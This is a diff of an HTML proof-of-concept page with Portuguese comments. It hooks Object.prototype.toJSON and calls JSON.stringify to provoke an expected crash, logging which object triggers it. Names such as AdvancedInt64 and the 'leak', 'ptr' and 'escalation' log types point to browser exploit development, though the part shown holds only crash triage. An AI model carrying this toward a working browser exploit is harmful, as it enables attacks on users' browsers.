@@ -2,105 +2,97 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3c - Identificando 'this' Crítico</title>
+    <title>PoC Isolado v2.3d - Teste de Botão e Log</title>
     <style> /* ... (estilos como antes) ... */ </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3c - Identificando 'this' Crítico</h1>
-    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3c</button>
+    <h1>PoC Isolado v2.3d - Teste de Botão e Log</h1>
+    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3d</button>
     <div id="output"></div>
 
     <script>
         // AdvancedInt64 e generalUtils como antes...
-        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
-        const generalUtils = { /* ... (código completo como antes) ... */ };
+        class AdvancedInt64 { /* ... (código como antes) ... */ }
+        const generalUtils = { /* ... (código como antes) ... */ };
 
-        const outputDivS1 = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');
-        const MEDIUM_PAUSE_S1 = 200;
-        let callCount_toJSON_c = 0;
+        const outputDivS1 = document.getElementById('output'); // Definido globalmente para logS1
+        const runBtn = document.getElementById('runBtn');     // Definido globalmente
 
         const logS1 = (message, type = 'info', funcName = '') => {
-            generalUtils.logToDiv('output', message, type, funcName);
-        };
-        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
+            // Certifique-se que outputDivS1 está acessível ou use document.getElementById aqui
+            const targetDiv = document.getElementById('output'); // Mais robusto pegar aqui
+            if (!targetDiv) {
+                console.error("DIV DE LOG 'output' NÃO ENCONTRADO POR logS1");
+                return;
+            }
+            try {
+                // ... (resto da lógica de logS1 como antes) ...
+                const timestamp = `[${new Date().toLocaleTimeString()}]`;
+                const prefix = funcName ? `[${funcName}] ` : '';
+                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
+                if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = targetDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; }
+                targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+                targetDiv.scrollTop = targetDiv.scrollHeight;
 
+            } catch(e) { console.error(`Erro DENTRO de logS1:`, e); }
+        };
+
+        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
         const originalTestObject_c = { a: 1, b: 'test_data_v23c', c: { nested_prop: true, d_val: "deep_val_v23c" } };
-        let lastThisBeforeKeys_c = null; // Para tentar salvar o this antes de Object.keys
+        let callCount_toJSON_c = 0;
+        let lastThisBeforeKeys_c = null;
 
         const testPPJsonHijack_v23c = async () => {
+            // ... (Conteúdo de testPPJsonHijack_v23c como na versão anterior) ...
             const FNAME = 'testPPJsonHijack_v23c';
             logS1("--- Iniciando Teste v2.3c: Identificando 'this' Crítico ---", 'test', FNAME);
-
-            const ppKey = 'toJSON'; 
+            const ppKey = 'toJSON';
             let originalToJSON_Descriptor_c;
             let ppAppliedSuccessfully_c = false;
             callCount_toJSON_c = 0;
             lastThisBeforeKeys_c = null;
-
             try {
                 originalToJSON_Descriptor_c = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-
                 Object.prototype[ppKey] = function() {
                     callCount_toJSON_c++;
                     let logPrefix = `toJSON PoC v2.3c (Chamada ${callCount_toJSON_c})`;
-
                     let thisType = typeof this;
                     let constructorName = (this && this.constructor) ? this.constructor.name : 'N/A';
-                    logS1(`<span class="math-inline">\{logPrefix\} \- INFO\: typeof this\='</span>{thisType}', constructor='${constructorName}'`, 'critical', FNAME);
-
+                    logS1(`${logPrefix} - INFO: typeof this='${thisType}', constructor='${constructorName}'`, 'critical', FNAME);
                     if (this === originalTestObject_c) logS1(`${logPrefix} - INFO: 'this' é o objeto raiz.`, 'critical', FNAME);
                     else if (this === originalTestObject_c.c) logS1(`${logPrefix} - INFO: 'this' é o objeto aninhado 'originalTestObject_c.c'.`, 'critical', FNAME);
-
-                    // Salva 'this' ANTES de tentar Object.keys(this)
-                    lastThisBeforeKeys_c = this; 
-
-                    // Forçar um pequeno delay para os logs acima terem chance de aparecerem
-                    // Esta é uma tentativa de "ganhar" do crash. Pode não funcionar ou pode alterar o timing.
-                    // Se não ajudar, remova esta linha.
-                    // await PAUSE_S1_FUNC(5); // CUIDADO: await dentro de uma função síncrona (toJSON) não funciona assim.
-                                            // Precisaríamos de uma gambiarra de busy-wait ou aceitar que o log pode não aparecer.
-                                            // Vamos focar no log síncrono e na captura do 'lastThisBeforeKeys_c'.
-
+                    lastThisBeforeKeys_c = this;
                     let keys = [];
                     try {
-                        // ESTA É A LINHA QUE PROVAVELMENTE TRAVA
-                        keys = Object.keys(this); 
-                        logS1(`<span class="math-inline">\{logPrefix\} \- SUCESSO\: Object\.keys\(this\) retornou \[</span>{keys.join(', ')}]`, 'good', FNAME);
-                        return { "toJSON_called_successfully_v23c": true, "object_keys": keys, "call_count_v23c": callCount_toJSON_c }; 
+                        keys = Object.keys(this);
+                        logS1(`${logPrefix} - SUCESSO: Object.keys(this) retornou [${keys.join(', ')}]`, 'good', FNAME);
+                        return { "toJSON_called_successfully_v23c": true, "object_keys": keys, "call_count_v23c": callCount_toJSON_c };
                     } catch (e) {
                         logS1(`${logPrefix} - ERRO em Object.keys(this): ${e.message}.`, 'error', FNAME);
-                        logS1(`     <span class="math-inline">\{logPrefix\} \- 'this' no momento do erro\: typeof\=</span>{typeof lastThisBeforeKeys_c}, constructor=${lastThisBeforeKeys_c && lastThisBeforeKeys_c.constructor ? lastThisBeforeKeys_c.constructor.name : 'N/A'}`, 'error', FNAME);
+                        logS1(`     ${logPrefix} - 'this' no momento do erro: typeof=${typeof lastThisBeforeKeys_c}, constructor=${lastThisBeforeKeys_c && lastThisBeforeKeys_c.constructor ? lastThisBeforeKeys_c.constructor.name : 'N/A'}`, 'error', FNAME);
                         return { "toJSON_error_getting_keys_v23c": true, "error_message": String(e.message), "call_count_v23c": callCount_toJSON_c };
                     }
                 };
                 ppAppliedSuccessfully_c = true;
                 logS1(`Poluição Object.prototype.${ppKey} aplicada (v2.3c).`, 'info', FNAME);
-
                 logS1(`Tentando JSON.stringify com originalTestObject_c... (CRASH ESPERADO AQUI)`, 'critical', FNAME);
-                // await PAUSE_S1_FUNC(50); // Pausa antes da chamada crítica
-                const result = JSON.stringify(originalTestObject_c); 
-
-                // Se chegar aqui, não travou como esperado
+                const result = JSON.stringify(originalTestObject_c);
                 logS1(`JSON.stringify CONCLUÍDO (inesperado!). Resultado: ${result ? result.substring(0, 500) : "N/A"}`, 'warn', FNAME);
-
             } catch (e) {
                 logS1(`Erro fatal capturado em testPPJsonHijack_v23c: ${e.message}`, 'error', FNAME);
                 if (e.stack) logS1(`Stack do erro: ${e.stack}`, 'error', FNAME);
                 console.error("JSON.stringify Crash Test Error (v2.3c):", e);
                 logS1("CRASH OBSERVADO ou erro capturado. Verifique console.", 'critical', FNAME);
             } finally {
-                if (ppAppliedSuccessfully_c) { 
+                if (ppAppliedSuccessfully_c) {
                     if (originalToJSON_Descriptor_c) {
                         Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor_c);
-                    } else {
-                        delete Object.prototype[ppKey];
-                    }
+                    } else { delete Object.prototype[ppKey]; }
                     logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup_v23c');
                 }
-                // Tenta logar o último 'this' capturado antes do Object.keys
-                 if (lastThisBeforeKeys_c) {
-                    logS1(`ÚLTIMO 'THIS' ANTES DE Object.keys (Chamada <span class="math-inline">\{callCount\_toJSON\_c\}\)\: typeof\=</span>{typeof lastThisBeforeKeys_c}, constructor=${lastThisBeforeKeys_c && lastThisBeforeKeys_c.constructor ? lastThisBeforeKeys_c.constructor.name : 'N/A'}`, 'leak', FNAME);
+                if (lastThisBeforeKeys_c) {
+                    logS1(`ÚLTIMO 'THIS' ANTES DE Object.keys (Chamada ${callCount_toJSON_c}): typeof=${typeof lastThisBeforeKeys_c}, constructor=${lastThisBeforeKeys_c && lastThisBeforeKeys_c.constructor ? lastThisBeforeKeys_c.constructor.name : 'N/A'}`, 'leak', FNAME);
                     if (lastThisBeforeKeys_c === originalTestObject_c) logS1(" -> Era o originalTestObject_c RAÍZ", 'leak', FNAME);
                     else if (lastThisBeforeKeys_c === originalTestObject_c.c) logS1(" -> Era o originalTestObject_c.c ANINHADO", 'leak', FNAME);
                 }
@@ -108,15 +100,26 @@
             logS1(`--- Teste JSON.stringify v2.3c Concluído ---`, 'test', FNAME);
         };
 
+
         const runIsolatedTest = async () => {
+            // Log super simples IMEDIATAMENTE ao clicar no botão
+            console.log("runIsolatedTest FOI CHAMADA VIA ONCLICK!"); // Log direto no console do navegador
+            document.getElementById('output').innerHTML = // Limpa e adiciona mensagem inicial no DIV
+                `<span class="log-test">[${new Date().toLocaleTimeString()}] [runIsolatedTest] Função runIsolatedTest iniciada!</span>\n`;
+
+            // O restante do código original de runIsolatedTest:
             if (runBtn) runBtn.disabled = true;
-            outputDivS1.innerHTML = '';
+            // outputDivS1.innerHTML = ''; // Já limpamos acima
             callCount_toJSON_c = 0;
             lastThisBeforeKeys_c = null;
-            logS1("==== INICIANDO PoC Isolado v2.3c (Identificando 'this' Crítico) ====", 'test', 'runIsolatedTest');
-            await testPPJsonHijack_v23c(); // Não chama mais simulateOOBLeakAndStoreS1
-            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
-            logS1("\n==== PoC Isolado v2.3c CONCLUÍDO ====", 'test', 'runIsolatedTest');
+            
+            logS1("==== INICIANDO PoC Isolado v2.3d (Teste de Botão e Log) ====", 'test', 'runIsolatedTest'); // Este usará a função logS1
+
+            // Chamada para a função de teste principal
+            await testPPJsonHijack_v23c();
+            
+            await PAUSE_S1_FUNC(200); // MEDIUM_PAUSE_S1
+            logS1("\n==== PoC Isolado v2.3d CONCLUÍDO ====", 'test', 'runIsolatedTest');
             if (runBtn) runBtn.disabled = false;
         };
     </script>
